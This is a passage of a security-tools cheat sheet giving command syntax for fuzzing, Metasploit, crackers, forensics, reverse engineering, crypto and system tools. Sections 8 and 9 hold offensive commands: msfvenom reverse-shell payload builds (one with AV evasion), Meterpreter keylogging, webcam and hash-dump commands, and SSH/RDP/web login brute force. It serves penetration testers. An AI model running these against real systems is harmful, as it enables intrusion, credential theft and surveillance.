# Directory fuzzing
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt

# Filter by response size (remove false positives)
ffuf -u http://target.com/FUZZ -w wordlist.txt -fs 4242

# Match only 200 and 301
ffuf -u http://target.com/FUZZ -w wordlist.txt -mc 200,301

# Subdomain fuzzing
ffuf -u http://FUZZ.target.com -w subdomains.txt -H "Host: FUZZ.target.com"

# Virtual host discovery
ffuf -u http://target.com -w vhosts.txt -H "Host: FUZZ.target.com" -fs 4242

# POST parameter fuzzing
ffuf -u http://target.com/login -X POST -d "user=admin&pass=FUZZ" -w passwords.txt -fc 401

# Header fuzzing
ffuf -u http://target.com/api -H "X-Custom-Header: FUZZ" -w values.txt

# Multiple fuzzing points
ffuf -u http://target.com/FUZZ1/FUZZ2 -w wordlist1.txt:FUZZ1 -w wordlist2.txt:FUZZ2

# With extensions
ffuf -u http://target.com/FUZZ -w wordlist.txt -e .php,.html,.js,.txt

# Rate limited
ffuf -u http://target.com/FUZZ -w wordlist.txt -rate 100

# Recursive fuzzing
ffuf -u http://target.com/FUZZ -w wordlist.txt -recursion -recursion-depth 2

# JSON output
ffuf -u http://target.com/FUZZ -w wordlist.txt -o results.json -of json

# API endpoint fuzzing
ffuf -u http://target.com/api/v1/FUZZ -w api_endpoints.txt -mc 200,201,204 -c
```

---

## 8. Exploitation Frameworks

### Metasploit Framework (msfconsole)

Comprehensive penetration testing framework with 2000+ exploits.

#### Core Commands

```
# Start msfconsole
msfconsole
msfconsole -q          # Quiet (no banner)
msfconsole -x "cmd"    # Execute command and exit

# Help
help                   # Show all commands
help <command>         # Help for specific command

# Search modules
search <term>
search type:exploit platform:windows smb
search cve:2021-44228
search name:eternalblue

# Use module
use exploit/windows/smb/ms17_010_eternalblue
use auxiliary/scanner/http/http_version

# Module info
info
info exploit/windows/smb/ms17_010_eternalblue

# Show options
show options            # Current module options
show payloads           # Compatible payloads
show targets            # Available targets
show advanced           # Advanced options
show evasion            # Evasion options

# Set options
set RHOSTS 192.168.1.1
set RPORT 445
set LHOST 192.168.1.100
set LPORT 4444
set PAYLOAD windows/meterpreter/reverse_tcp

# Global options
setg RHOSTS 192.168.1.0/24
setg LHOST 192.168.1.100

# Execute
exploit / run
exploit -j             # Run as background job

# Back / exit
back                   # Return to main prompt
exit                   # Exit msfconsole
```

#### Session Management

```
sessions               # List active sessions
sessions -i 1          # Interact with session 1
sessions -k 1          # Kill session 1
sessions -K            # Kill all sessions
sessions -u 1          # Upgrade shell to meterpreter
background             # Background current session (Ctrl+Z)
```

#### Meterpreter Commands

```
# System
sysinfo                # System information
getuid                 # Current user
getpid                 # Current process ID
ps                     # List processes
migrate <PID>          # Migrate to process
shell                  # Drop to system shell

# File system
ls                     # List directory
cd <dir>               # Change directory
pwd                    # Print working directory
download <file>        # Download file
upload <file>          # Upload file
cat <file>             # Read file
edit <file>            # Edit file
mkdir <dir>            # Create directory
rm <file>              # Delete file

# Network
ipconfig / ifconfig    # Network interfaces
route                  # Routing table
portfwd add -l 8080 -p 80 -r 10.0.0.1  # Port forward
arp                    # ARP table

# Privilege escalation
getsystem              # Attempt SYSTEM privileges
hashdump               # Dump password hashes

# Persistence
run persistence -h     # Persistence help

# Pivoting
run autoroute -s 10.0.0.0/24  # Add route for pivoting

# Keylogging
keyscan_start          # Start keylogger
keyscan_dump           # Dump keystrokes
keyscan_stop           # Stop keylogger

# Screenshot
screenshot             # Take screenshot

# Webcam
webcam_list            # List webcams
webcam_snap            # Take photo
```

#### msfvenom (Payload Generator)

```bash
# List payloads
msfvenom -l payloads

# List encoders
msfvenom -l encoders

# List formats
msfvenom --list formats

# Windows reverse shell EXE
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe

# Linux reverse shell ELF
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o shell.elf

# PHP reverse shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.php

# Python reverse shell
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.py

# Windows shellcode (C format)
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f c

# With encoder (AV evasion)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe

# Web shell (ASP)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f asp -o shell.asp

# Java WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f war -o shell.war

# Android APK
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -o shell.apk

# macOS reverse shell
msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f macho -o shell.macho
```

---

### searchsploit

Offline copy of Exploit-DB. Search for public exploits and shellcodes.

**Key Flags:**

```
-t          Search in exploit title
-e          Search in exploit path
-j          JSON output
-p          Show full path to exploit
-m          Mirror (copy) exploit to current directory
-w          Show Exploit-DB URL
--id        Display EDB-ID
--colour    Force coloured output
--nmap      Parse nmap XML output for relevant exploits
--update    Update database
-x          Examine (open) exploit
```

**Examples:**

```bash
# Search for exploits
searchsploit apache 2.4
searchsploit wordpress plugin

# Search specific terms
searchsploit -t "privilege escalation" linux kernel

# Copy exploit to current directory
searchsploit -m 42315

# Show full path
searchsploit -p 42315

# Show Exploit-DB URL
searchsploit -w apache 2.4

# Parse nmap results for exploits
searchsploit --nmap scan_results.xml

# JSON output
searchsploit -j wordpress 5.0

# Examine exploit
searchsploit -x 42315

# Update database
searchsploit --update
```

---

## 9. Password / Hash

### john (John the Ripper)

Offline password hash cracker. Supports 300+ hash types.

**Key Flags:**

```
--wordlist     Wordlist file
--rules        Enable word mangling rules
--format       Hash format
--show         Show cracked passwords
--list=formats List supported formats
--incremental  Brute force mode
--mask         Mask attack
--fork         Parallel processes
--pot          Custom pot file
--session      Name the session
--restore      Restore previous session
```

**Examples:**

```bash
# Crack with wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Specify hash format
john --format=raw-md5 --wordlist=rockyou.txt hashes.txt
john --format=raw-sha256 --wordlist=rockyou.txt hashes.txt
john --format=bcrypt --wordlist=rockyou.txt hashes.txt
john --format=ntlm --wordlist=rockyou.txt hashes.txt

# With rules (word mangling)
john --wordlist=rockyou.txt --rules hashes.txt
john --wordlist=rockyou.txt --rules=jumbo hashes.txt

# Incremental (brute force)
john --incremental hashes.txt
john --incremental=digits hashes.txt

# Mask attack
john --mask='?u?l?l?l?d?d?d?d' hashes.txt
# ?u=uppercase ?l=lowercase ?d=digit ?s=special ?a=all

# Show cracked passwords
john --show hashes.txt

# List supported formats
john --list=formats

# Prepare shadow file
unshadow /etc/passwd /etc/shadow > unshadowed.txt
john --wordlist=rockyou.txt unshadowed.txt

# Crack ZIP password
zip2john protected.zip > zip_hash.txt
john --wordlist=rockyou.txt zip_hash.txt

# Crack SSH key
ssh2john id_rsa > ssh_hash.txt
john --wordlist=rockyou.txt ssh_hash.txt

# Crack KeePass database
keepass2john database.kdbx > keepass_hash.txt
john --wordlist=rockyou.txt keepass_hash.txt

# Multi-process
john --fork=4 --wordlist=rockyou.txt hashes.txt

# Session management
john --session=my_crack --wordlist=rockyou.txt hashes.txt
john --restore=my_crack
```

---

### hashcat

GPU-accelerated hash cracker. Fastest offline cracker available.

**Key Flags:**

```
-m          Hash type (mode number)
-a          Attack mode (0=dict, 1=combinator, 3=mask, 6=dict+mask, 7=mask+dict)
-o          Output file
-r          Rules file
--force     Ignore warnings
--show      Show cracked hashes
-w          Workload profile (1=low, 2=default, 3=high, 4=nightmare)
-O          Optimized kernels
--username  Hashes include usernames
-j / -k     Rules for left/right dict (combinator)
--increment Increment mask length
--increment-min/max  Min/max mask length
-S          Slow candidates (no GPU overhead)
--session   Session name
--restore   Restore session
--benchmark Benchmark
```

**Common Hash Modes (-m):**

```
0       MD5
100     SHA1
1400    SHA256
1700    SHA512
1000    NTLM
3200    bcrypt
5600    NetNTLMv2
13100   Kerberos TGS-REP (Kerberoast)
18200   Kerberos AS-REP (ASREPRoast)
1800    SHA-512 (Unix)
500     MD5 (Unix)
7500    Kerberos AS-REQ
22000   WPA-PBKDF2-PMKID+EAPOL
```

**Examples:**

```bash
# Dictionary attack on MD5
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Dictionary attack on NTLM
hashcat -m 1000 -a 0 hashes.txt rockyou.txt

# Dictionary with rules
hashcat -m 0 -a 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 0 -a 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule

# Mask attack (brute force)
hashcat -m 0 -a 3 hashes.txt '?a?a?a?a?a?a?a?a'
# ?l=lower ?u=upper ?d=digit ?s=special ?a=all ?b=0x00-0xff

# Mask with increment
hashcat -m 0 -a 3 hashes.txt '?a?a?a?a?a?a?a?a' --increment --increment-min=4

# Custom charset
hashcat -m 0 -a 3 hashes.txt -1 '?l?d' '?1?1?1?1?1?1'

# Combinator attack (word1+word2)
hashcat -m 0 -a 1 hashes.txt dict1.txt dict2.txt

# Show cracked
hashcat -m 0 --show hashes.txt

# Benchmark
hashcat --benchmark

# WPA/WPA2 cracking
hashcat -m 22000 -a 0 capture.hc22000 rockyou.txt

# Kerberoast
hashcat -m 13100 -a 0 tgs_hashes.txt rockyou.txt

# High workload
hashcat -m 0 -a 0 -w 4 hashes.txt rockyou.txt

# Output to file
hashcat -m 0 -a 0 hashes.txt rockyou.txt -o cracked.txt
```

---

### hydra

Online brute force tool. Supports 50+ protocols.

**Key Flags:**

```
-l          Single username
-L          Username list
-p          Single password
-P          Password list
-C          Colon-separated user:pass file
-t          Threads per target (default: 16)
-s          Port
-f          Stop on first valid pair
-v / -V     Verbose / show each attempt
-o          Output file
-M          Target list file
-e          Try: n=null, s=login as pass, r=reversed login
-w          Max wait time for response
-x          Brute force (min:max:charset)
```

**Examples:**

```bash
# SSH brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1 -t 4

# FTP brute force
hydra -L users.txt -P passwords.txt ftp://192.168.1.1

# HTTP POST form
hydra -l admin -P passwords.txt 192.168.1.1 http-post-form "/login:user=^USER^&pass=^PASS^:Invalid credentials" -t 10

# HTTP Basic Auth
hydra -l admin -P passwords.txt 192.168.1.1 http-get /admin

# RDP
hydra -l administrator -P rockyou.txt rdp://192.168.1.1 -t 1

# SMB
hydra -l admin -P passwords.txt smb://192.168.1.1

# MySQL
hydra -l root -P passwords.txt mysql://192.168.1.1

# SMTP
hydra -l user@target.com -P passwords.txt smtp://mail.target.com

# Multiple targets
hydra -l admin -P passwords.txt -M targets.txt ssh -t 4

# Try null/login/reverse
hydra -l admin -P passwords.txt -e nsr ssh://192.168.1.1

# Brute force generation
hydra -l admin -x 4:6:aA1 ssh://192.168.1.1
# 4:6 = min:max length, aA1 = lowercase+uppercase+digits
```

---

### medusa

Parallel, modular, brute force login tool.

**Key Flags:**

```
-h          Target host
-H          Host list
-u          Username
-U          Username file
-p          Password
-P          Password file
-C          user:pass combo file
-M          Module (ssh, ftp, http, smb, etc.)
-t          Threads
-n          Port
-f          Stop on first valid
-F          Stop on first valid per host
-v          Verbose (0-6)
-O          Output file
```

**Examples:**

```bash
# SSH attack
medusa -h 192.168.1.1 -u admin -P passwords.txt -M ssh -t 4

# FTP with user list
medusa -h 192.168.1.1 -U users.txt -P passwords.txt -M ftp

# Multiple hosts
medusa -H hosts.txt -u admin -P passwords.txt -M ssh -t 2

# Specific port
medusa -h 192.168.1.1 -u admin -P passwords.txt -M ssh -n 2222
```

---

## 10. Forensics

### volatility (Memory Forensics)

Memory forensics framework. Volatility 3 (Python 3) is current standard.

#### Volatility 3 Syntax

```bash
# Image info / OS detection
vol -f memory.dmp windows.info.Info

# List processes
vol -f memory.dmp windows.pslist.PsList
vol -f memory.dmp windows.pstree.PsTree
vol -f memory.dmp windows.psscan.PsScan      # Including hidden

# Network connections
vol -f memory.dmp windows.netscan.NetScan
vol -f memory.dmp windows.netstat.NetStat

# DLL list
vol -f memory.dmp windows.dlllist.DllList --pid 1234

# Handles
vol -f memory.dmp windows.handles.Handles --pid 1234

# Command line arguments
vol -f memory.dmp windows.cmdline.CmdLine

# Registry hives
vol -f memory.dmp windows.registry.hivelist.HiveList
vol -f memory.dmp windows.registry.printkey.PrintKey --key "Software\Microsoft\Windows\CurrentVersion\Run"

# Dump process memory
vol -f memory.dmp windows.memmap.Memmap --pid 1234 --dump

# Dump files
vol -f memory.dmp windows.filescan.FileScan
vol -f memory.dmp windows.dumpfiles.DumpFiles --pid 1234

# Detect malware
vol -f memory.dmp windows.malfind.Malfind

# Password hashes
vol -f memory.dmp windows.hashdump.Hashdump

# Services
vol -f memory.dmp windows.svcscan.SvcScan

# Environment variables
vol -f memory.dmp windows.envars.Envars

# Linux memory analysis
vol -f memory.dmp linux.pslist.PsList
vol -f memory.dmp linux.bash.Bash
vol -f memory.dmp linux.check_syscall.Check_syscall
```

#### Volatility 2 Syntax (Legacy)

```bash
# Image info
volatility -f memory.dmp imageinfo

# Profile-based analysis
volatility -f memory.dmp --profile=Win7SP1x64 pslist
volatility -f memory.dmp --profile=Win7SP1x64 pstree
volatility -f memory.dmp --profile=Win7SP1x64 netscan
volatility -f memory.dmp --profile=Win7SP1x64 hivelist
volatility -f memory.dmp --profile=Win7SP1x64 hashdump
volatility -f memory.dmp --profile=Win7SP1x64 malfind
```

---

### binwalk

Firmware analysis and extraction tool.

**Key Flags:**

```
-e          Extract files
-M          Matryoshka (recursive extraction)
-D          Custom extraction rule
-A          Scan for executable opcodes
-E          Entropy analysis
-W          Hex diff between files
-R          Raw string search
--signature Custom signature file
-y          Include only specified types
-x          Exclude specified types
```

**Examples:**

```bash
# Scan for embedded files
binwalk firmware.bin

# Extract embedded files
binwalk -e firmware.bin

# Recursive extraction
binwalk -eM firmware.bin

# Entropy analysis (detect encryption/compression)
binwalk -E firmware.bin

# Search for specific file types
binwalk -y filesystem firmware.bin

# Opcode scan (architecture detection)
binwalk -A firmware.bin

# Raw string search
binwalk -R "password" firmware.bin

# Compare two files
binwalk -W file1.bin file2.bin

# Custom extraction
binwalk -D 'zip:zip:unzip %e' firmware.bin
```

---

### foremost

File carving tool. Recovers files based on headers, footers, and data structures.

**Key Flags:**

```
-i          Input file/device
-o          Output directory
-t          File types (jpg, gif, png, bmp, avi, exe, mpg, wav, pdf, ole, doc, zip, rar, htm, cpp, all)
-v          Verbose
-q          Quick mode
-T          Time stamp output directory
-c          Configuration file
```

**Examples:**

```bash
# Recover all file types
foremost -i disk.img -o recovered/

# Recover specific types
foremost -t jpg,png,pdf -i disk.img -o recovered/

# Recover from device
foremost -t all -i /dev/sdb -o recovered/

# Verbose with timestamp
foremost -v -T -t doc,pdf,xls -i disk.img -o recovered/
```

---

### strings

Extract printable strings from binary files.

**Key Flags:**

```
-a          Scan entire file (not just loadable sections)
-n          Minimum string length (default: 4)
-e          Encoding (s=7-bit, S=8-bit, b=16-bit big-endian, l=16-bit little-endian, B/L=32-bit)
-t          Print offset (o=octal, x=hex, d=decimal)
-f          Print filename
```

**Examples:**

```bash
# Extract strings (min 4 chars)
strings binary.exe

# Minimum 8 characters
strings -n 8 binary.exe

# With hex offsets
strings -t x binary.exe

# Wide strings (Unicode)
strings -e l binary.exe

# Search for patterns
strings binary.exe | grep -i "password\|secret\|key\|token"
strings binary.exe | grep -E "https?://"
strings binary.exe | grep -E "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"

# From memory dump
strings -n 10 memory.dmp | grep -i "login\|user\|pass"
```

---

### file

Determine file type using magic bytes.

```bash
# Identify file type
file unknown_file
file suspicious.pdf
file firmware.bin

# MIME type output
file --mime-type unknown_file

# Multiple files
file *

# Don't follow symlinks
file -h symlink

# Brief output
file -b unknown_file
```

---

### xxd / hexdump

Hex viewers and editors.

```bash
# xxd — hex dump
xxd file.bin
xxd file.bin | head -20                  # First 20 lines
xxd -l 256 file.bin                      # First 256 bytes
xxd -s 0x100 -l 64 file.bin             # 64 bytes starting at offset 0x100
xxd -i file.bin                          # C include format
xxd -p file.bin                          # Plain hex (no formatting)
xxd -r hex_dump.txt > file.bin           # Reverse (hex to binary)
xxd -g 1 file.bin                        # Group by 1 byte
xxd -c 32 file.bin                       # 32 bytes per line
xxd -e file.bin                          # Little-endian

# hexdump
hexdump -C file.bin                      # Canonical hex+ASCII
hexdump -C -n 256 file.bin              # First 256 bytes
hexdump -C -s 0x100 -n 64 file.bin      # From offset, N bytes
hexdump -v file.bin                      # Don't suppress duplicate lines
hexdump -e '16/1 "%02x " "\n"' file.bin  # Custom format
```

---

## 11. Reverse Engineering

### objdump

Display information from object files. Part of GNU binutils.

**Key Flags:**

```
-d          Disassemble executable sections
-D          Disassemble all sections
-f          File headers
-h          Section headers
-t          Symbol table
-T          Dynamic symbol table
-R          Dynamic relocation entries
-x          All headers
-s          Full contents of all sections
-j          Specific section
-M          Disassembler options (intel, att)
--no-show-raw-insn  Hide hex bytes
```

**Examples:**

```bash
# Disassemble
objdump -d binary

# Disassemble with Intel syntax
objdump -d -M intel binary

# File headers
objdump -f binary

# Section headers
objdump -h binary

# Symbol table
objdump -t binary

# Specific section
objdump -d -j .text binary

# Full dump
objdump -x binary

# Disassemble specific function (pipe to grep)
objdump -d binary | grep -A 20 "<main>:"
```

---

### strace

Trace system calls and signals.

**Key Flags:**

```
-p          Attach to PID
-f          Follow forks
-e          Filter expression (trace=open,read,write)
-o          Output file
-c          Count time, calls, errors
-t/-tt/-ttt Timestamps
-s          Max string size (default: 32)
-v          Verbose (don't abbreviate)
-y          Print paths for file descriptors
```

**Examples:**

```bash
# Trace all syscalls
strace ./binary

# Trace specific syscalls
strace -e trace=open,read,write,close ./binary

# Trace network calls
strace -e trace=network ./binary

# Trace file operations
strace -e trace=file ./binary

# Attach to running process
strace -p 1234

# Follow child processes
strace -f ./binary

# Output to file with timestamps
strace -tt -o trace.log ./binary

# Count syscalls (summary)
strace -c ./binary

# Increased string length
strace -s 256 ./binary

# Trace specific signal
strace -e signal=SIGSEGV ./binary
```

---

### ltrace

Trace library calls.

**Key Flags:**

```
-p          Attach to PID
-f          Follow forks
-e          Filter expression
-o          Output file
-c          Count time, calls
-s          Max string size
-n          Indent nested calls
```

**Examples:**

```bash
# Trace library calls
ltrace ./binary

# Filter specific functions
ltrace -e strcmp,strcpy,malloc ./binary

# Count calls (summary)
ltrace -c ./binary

# Output to file
ltrace -o ltrace.log ./binary

# Follow forks
ltrace -f ./binary

# Increased string length
ltrace -s 200 ./binary
```

---

### radare2 (r2)

Advanced CLI reverse engineering framework. Disassembly, debugging, binary analysis.

**CLI Launch Options:**

```
r2 binary              # Open binary
r2 -d binary           # Open in debug mode
r2 -A binary           # Open and auto-analyze
r2 -w binary           # Open in write mode
r2 -a <arch>           # Specify architecture
r2 -b <bits>           # Specify bits (32, 64)
r2 -k <kernel>         # Specify OS kernel
```

**Core Commands:**

```
# Analysis
aa                     # Analyze all
aaa                    # Analyze all (thorough)
aaaa                   # Analyze all (maximum)
afl                    # List functions
afl~main               # Filter functions by name
af                     # Analyze function at current offset
afi                    # Function info
axt <addr>             # Cross-references to address
axf <addr>             # Cross-references from address

# Navigation
s <addr>               # Seek to address
s main                 # Seek to main function
s+N / s-N              # Seek forward/backward N bytes

# Disassembly
pd 20                  # Print 20 disassembly lines
pdf                    # Print disassembly of current function
pds                    # Print disassembly summary
pdg                    # Decompile (requires r2ghidra)

# Print / Inspect
px 64                  # Print 64 bytes in hex
ps                     # Print string at current offset
pxr                    # Print references
pf                     # Print formatted
pi 10                  # Print 10 instructions (no address)

# Strings
iz                     # Strings in data sections
izz                    # All strings in binary
iz~password            # Search strings for "password"

# Imports / Exports
ii                     # Imports
iE                     # Exports
iS                     # Sections
ie                     # Entry points
il                     # Libraries

# Search
/ <string>             # Search for string
/x <hex>               # Search for hex bytes
/R <pattern>           # Search ROP gadgets

# Write
wx <hex>               # Write hex bytes
wa <asm>               # Write assembly

# Debug mode
db <addr>              # Set breakpoint
dc                     # Continue execution
ds                     # Step into
dso                    # Step over
dr                     # Show registers
dm                     # Memory map

# Visual mode
V                      # Visual mode
VV                     # Visual graph mode
p / P                  # Cycle through views in visual mode
q                      # Quit visual mode

# Quit
q                      # Quit r2
```

**One-liner Patterns:**

```bash
# List all functions
r2 -q -c 'aaa; afl' binary

# Disassemble main
r2 -q -c 'aaa; s main; pdf' binary

# Find strings containing "password"
r2 -q -c 'izz~password' binary

# List imports
r2 -q -c 'ii' binary

# Extract all strings
r2 -q -c 'izz' binary > strings.txt

# Decompile function (with r2ghidra)
r2 -q -c 'aaa; s main; pdg' binary
```

---

### Ghidra (CLI / headless mode)

NSA's reverse engineering tool. Headless mode for scripted analysis.

```bash
# Headless analysis
analyzeHeadless <project_dir> <project_name> -import <binary> -postScript <script.py>

# Import and analyze
analyzeHeadless /tmp/ghidra_projects MyProject \
  -import binary.exe \
  -postScript ExportFunctions.py

# Process existing project
analyzeHeadless /tmp/ghidra_projects MyProject \
  -process binary.exe \
  -postScript Decompile.py \
  -noanalysis

# With log
analyzeHeadless /tmp/ghidra_projects MyProject \
  -import binary.exe \
  -log analysis.log

# Delete project after
analyzeHeadless /tmp/ghidra_projects MyProject \
  -import binary.exe \
  -postScript script.py \
  -deleteProject
```

---

## 12. Crypto

### openssl

Cryptographic toolkit. SSL/TLS, certificates, encryption, hashing.

```bash
# Generate RSA key pair
openssl genrsa -out private.pem 4096
openssl rsa -in private.pem -pubout -out public.pem

# Generate ED25519 key
openssl genpkey -algorithm Ed25519 -out private.pem

# Generate self-signed certificate
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

# View certificate info
openssl x509 -in cert.pem -text -noout

# Check remote SSL certificate
openssl s_client -connect target.com:443 -servername target.com
openssl s_client -connect target.com:443 </dev/null 2>/dev/null | openssl x509 -text -noout

# Verify certificate chain
openssl verify -CAfile ca.pem cert.pem

# Hash strings
echo -n "password" | openssl dgst -md5
echo -n "password" | openssl dgst -sha256
echo -n "password" | openssl dgst -sha512

# Hash files
openssl dgst -sha256 file.txt

# Encrypt file (AES-256-CBC)
openssl enc -aes-256-cbc -salt -in plaintext.txt -out encrypted.bin -pbkdf2
openssl enc -aes-256-cbc -d -in encrypted.bin -out decrypted.txt -pbkdf2

# Base64 encode/decode
openssl base64 -in file.bin -out encoded.txt
openssl base64 -d -in encoded.txt -out decoded.bin
echo -n "hello" | openssl base64

# RSA encrypt/decrypt
openssl rsautl -encrypt -pubin -inkey public.pem -in plaintext.txt -out encrypted.bin
openssl rsautl -decrypt -inkey private.pem -in encrypted.bin -out decrypted.txt

# Generate random bytes
openssl rand -hex 32
openssl rand -base64 32
openssl rand -out random.bin 256

# PKCS12 operations
openssl pkcs12 -export -out cert.pfx -inkey key.pem -in cert.pem
openssl pkcs12 -in cert.pfx -out cert.pem -nodes

# CSR generation
openssl req -new -key private.pem -out request.csr
openssl req -in request.csr -text -noout

# Test SSL/TLS versions
openssl s_client -connect target.com:443 -tls1_2
openssl s_client -connect target.com:443 -tls1_3

# List available ciphers
openssl ciphers -v

# Speed test (benchmark)
openssl speed aes-256-cbc sha256 rsa4096
```

---

### gpg (GNU Privacy Guard)

OpenPGP encryption and signing.

```bash
# Generate key pair
gpg --gen-key
gpg --full-generate-key              # More options

# List keys
gpg --list-keys
gpg --list-secret-keys
gpg --fingerprint

# Export keys
gpg --export -a "User Name" > public.asc
gpg --export-secret-keys -a "User Name" > private.asc

# Import key
gpg --import public.asc

# Encrypt file
gpg -e -r recipient@email.com file.txt
gpg -e -r recipient@email.com -o encrypted.gpg file.txt

# Symmetric encryption (password-based)
gpg -c file.txt
gpg -c --cipher-algo AES256 file.txt

# Decrypt
gpg -d encrypted.gpg > decrypted.txt
gpg -d file.txt.gpg

# Sign file
gpg --sign file.txt                  # Binary signature
gpg --clearsign file.txt             # Clear-text signature
gpg --detach-sign file.txt           # Detached signature

# Verify signature
gpg --verify file.txt.sig file.txt
gpg --verify file.txt.asc

# Encrypt and sign
gpg -se -r recipient@email.com file.txt

# Key server operations
gpg --keyserver hkps://keys.openpgp.org --search-keys email@example.com
gpg --keyserver hkps://keys.openpgp.org --recv-keys <KEY_ID>
gpg --keyserver hkps://keys.openpgp.org --send-keys <KEY_ID>
```

---

### ssh-keygen

SSH key generation and management.

```bash
# Generate ED25519 key (recommended)
ssh-keygen -t ed25519 -C "comment"

# Generate RSA key
ssh-keygen -t rsa -b 4096 -C "comment"

# Generate with specific filename
ssh-keygen -t ed25519 -f ~/.ssh/my_key -C "comment"

# Change passphrase
ssh-keygen -p -f ~/.ssh/id_ed25519

# View public key fingerprint
ssh-keygen -lf ~/.ssh/id_ed25519.pub

# View key in different formats
ssh-keygen -lf ~/.ssh/id_ed25519.pub -E md5
ssh-keygen -lf ~/.ssh/id_ed25519.pub -E sha256

# Convert between formats
ssh-keygen -e -f ~/.ssh/id_rsa.pub -m RFC4716     # OpenSSH to RFC4716
ssh-keygen -i -f key.pub -m RFC4716               # RFC4716 to OpenSSH

# Generate key from known_hosts
ssh-keygen -R hostname                             # Remove host from known_hosts
ssh-keygen -F hostname                             # Find host in known_hosts
ssh-keygen -H                                      # Hash known_hosts file

# Extract public key from private key
ssh-keygen -y -f ~/.ssh/id_ed25519 > ~/.ssh/id_ed25519.pub
```

---

## 13. System

### ss (Socket Statistics)

Modern replacement for netstat. Show network socket information.

**Key Flags:**

```
-t          TCP sockets
-u          UDP sockets
-l          Listening sockets
-n          Numeric (no resolution)
-p          Show process using socket
-a          All sockets (listening + non-listening)
-e          Extended info
-s          Summary statistics
-4 / -6     IPv4 / IPv6 only
-o          Show timer info
```

**Examples:**

```bash
# All listening TCP ports with process info
ss -tlnp

# All connections
ss -tanp

# Filter by port
ss -tlnp | grep ':80'
ss -tn 'sport == :443'

# Filter by state
ss -t state established
ss -t state time-wait

# UDP sockets
ss -ulnp

# Summary
ss -s

# Connections to specific host
ss -tn dst 192.168.1.1
```

---

### lsof (List Open Files)

List open files and the processes using them.

**Key Flags:**

```
-i          Network connections
-p          By PID
-u          By user
-c          By command name
-t          Terse (PID only)
+D          Recursively search directory
-n          No hostname resolution
-P          No port name resolution
```

**Examples:**

```bash
# All network connections
lsof -i -nP

# TCP connections
lsof -i TCP -nP

# Specific port
lsof -i :80
lsof -i TCP:443

# By process
lsof -p 1234

# By user
lsof -u www-data

# Files in directory
lsof +D /var/log/

# Who is using a file
lsof /var/log/syslog

# Listening sockets
lsof -i -sTCP:LISTEN -nP

# Connections to host
lsof -i @192.168.1.1

# Get PIDs only (for killing)
lsof -t -i :8080
kill $(lsof -t -i :8080)
```

---

### ip

Network configuration and routing. Replacement for ifconfig/route.

```bash
# Show interfaces
ip addr show
ip a                                     # Short form
ip -br a                                 # Brief format

# Show specific interface
ip addr show eth0

# Add/remove IP address
ip addr add 192.168.1.100/24 dev eth0
ip addr del 192.168.1.100/24 dev eth0

# Bring interface up/down
ip link set eth0 up
ip link set eth0 down

# Change MAC address
ip link set eth0 address 00:11:22:33:44:55

# Show routing table
ip route show
ip route get 8.8.8.8                    # Show route to destination

# Add/delete route
ip route add 10.0.0.0/24 via 192.168.1.1
ip route add default via 192.168.1.1
ip route del 10.0.0.0/24

# ARP table
ip neigh show
ip neigh flush all

# Show link statistics
ip -s link show eth0

# Network namespaces
ip netns list
ip netns add test_ns
ip netns exec test_ns ip addr show
```

---

### iptables

IPv4 packet filter and NAT. Firewall configuration.

```bash
# List all rules
iptables -L -n -v
iptables -L -n -v --line-numbers

# List specific chain
iptables -L INPUT -n -v
iptables -L OUTPUT -n -v
iptables -L FORWARD -n -v

# List NAT rules
iptables -t nat -L -n -v

# Flush all rules
iptables -F
iptables -t nat -F

# Set default policies
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT ACCEPT

# Allow established connections
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# Allow specific port
iptables -A INPUT -p tcp --dport 22 -j ACCEPT
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -j ACCEPT

# Allow from specific IP
iptables -A INPUT -s 192.168.1.100 -j ACCEPT

# Block IP
iptables -A INPUT -s 10.0.0.1 -j DROP

# Allow loopback
iptables -A INPUT -i lo -j ACCEPT

# Port forwarding (NAT)
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.100:8080
iptables -t nat -A POSTROUTING -j MASQUERADE

# Log dropped packets
iptables -A INPUT -j LOG --log-prefix "DROPPED: " --log-level 4

# Delete rule by number
iptables -D INPUT 3

# Save / restore
iptables-save > /etc/iptables/rules.v4
iptables-restore < /etc/iptables/rules.v4

# Rate limiting
iptables -A INPUT -p tcp --dport 22 -m conntrack --ctstate NEW -m recent --set
iptables -A INPUT -p tcp --dport 22 -m conntrack --ctstate NEW -m recent --update --seconds 60 --hitcount 4 -j DROP
```

---

### systemctl

Control the systemd system and service manager.

```bash
# Service management
systemctl start <service>
systemctl stop <service>
systemctl restart <service>
systemctl reload <service>
systemctl status <service>
systemctl enable <service>            # Start at boot
systemctl disable <service>           # Don't start at boot
systemctl is-active <service>
systemctl is-enabled <service>

# List services
systemctl list-units --type=service
systemctl list-units --type=service --state=running
systemctl list-unit-files --type=service

# Show dependencies
